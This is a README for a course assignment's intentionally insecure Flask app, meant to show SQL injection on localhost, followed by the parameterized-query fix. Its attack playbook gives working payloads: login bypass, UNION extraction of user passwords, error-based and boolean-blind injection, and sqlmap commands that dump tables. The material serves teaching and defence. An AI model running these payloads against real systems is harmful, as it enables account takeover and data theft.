# vulnerable_app — CSCI262 A3 SQL Injection demo (INSECURE on purpose)

Run **only on localhost inside your VM.** This app is deliberately broken to
demonstrate SQL injection; the companion `secure_app` patches the same two
endpoints with parameterized queries.

## Setup
```bash
pip install -r requirements.txt
python init_db.py      # builds app.db (run again any time to reset the demo)
python app.py          # http://127.0.0.1:5000
```

Legit login (to show normal behaviour first): `admin` / `S3cr3tAdminPass!`

## Where the flaw lives
- `app.py` → `login()`  builds the auth query by string concatenation.
- `app.py` → `search()` builds the product query by string concatenation.
The page echoes the executed SQL and raw DB errors so the audience can *see* it.

## Attack playbook (screenshot each step for the report)

### 1. Authentication bypass
In the login form:
- Username: `' OR '1'='1' --`
- Password: anything
You are logged in as `admin` with no password. The query becomes:
`SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = '...'`
The `--` comments out the password check; `'1'='1'` is always true.

### 2. UNION-based extraction (search box)
The products query returns 2 columns (name, price), so the UNION must too.
In the search box type:
```
x' UNION SELECT username, password FROM users --
```
The results table now lists every username and password. To pull the second
secret table:
```
x' UNION SELECT label, secret_hash FROM secrets --
```

### 3. Error-based disclosure
Enter a single quote in the search box:
```
'
```
The page prints the raw `SQL error: ...` (unterminated string). Mismatch the
UNION column count to leak more structure:
```
x' UNION SELECT 1 --
```
→ error `SELECTs ... do not have the same number of result columns`, which tells
the attacker the column count. `debug=True` also shows a full stack trace.

### 4. Blind / time-based  — IMPORTANT caveat
`' AND SLEEP(5)--` is **MySQL** syntax and does nothing on SQLite (SQLite has no
`SLEEP`). You have two honest options:

- **Boolean-based blind (works as-is on SQLite).** Compare the two search
  responses — one returns rows, one returns none. The search wraps your input as
  `LIKE '%<input>%'`, so end each payload with `-- ` to kill the trailing `%'`:
  - `Laptop' AND '1'='1' -- ` → Laptop shown (condition true)
  - `Laptop' AND '1'='2' -- ` → no rows (condition false)
  Extend it to extract data one character at a time, e.g.
  `Laptop' AND substr((SELECT password FROM users WHERE username='admin'),1,1)='S' -- `
  returns the Laptop row only when the guessed character is correct (it is `S`).

- **Time-based on SQLite** needs a heavy expression instead of SLEEP, e.g. a
  cartesian/`randomblob` load — fiddly to do by hand. If you specifically want
  the clean 5-second `SLEEP` payload, set the stack to **MySQL** (the plan notes
  that option). For a reliable time delay demo without switching databases, let
  **sqlmap** do it (next section) — it picks a SQLite-compatible technique
  automatically.

### 5. sqlmap (automated, strong visual payoff on Kali)
Log in first so you have a session cookie, then point sqlmap at the GET param:
```bash
# grab the session cookie from your browser dev tools, or let sqlmap log in
sqlmap -u "http://127.0.0.1:5000/search?q=Laptop" \
       --cookie="session=PASTE_COOKIE_HERE" \
       --batch --dbs
# then enumerate:
sqlmap -u "http://127.0.0.1:5000/search?q=Laptop" \
       --cookie="session=..." --batch -D app --tables
sqlmap -u "http://127.0.0.1:5000/search?q=Laptop" \
       --cookie="session=..." --batch -D app -T users --dump
```
sqlmap will report the injection point, back-end DBMS (SQLite), and dump the
tables — exactly the automated-attack slide.

## The fix (for secure_app / the slide diff)
Replace concatenation with a parameterized query. Login becomes:
```python
query = "SELECT * FROM users WHERE username = ? AND password = ?"
row = con.execute(query, (username, password)).fetchone()
```
and search becomes:
```python
query = "SELECT name, price FROM products WHERE name LIKE ?"
results = con.execute(query, ("%" + q + "%",)).fetchall()
```
Re-run every payload above against secure_app: each one is now treated as a
literal string, so it matches no rows and never changes the query structure.
```
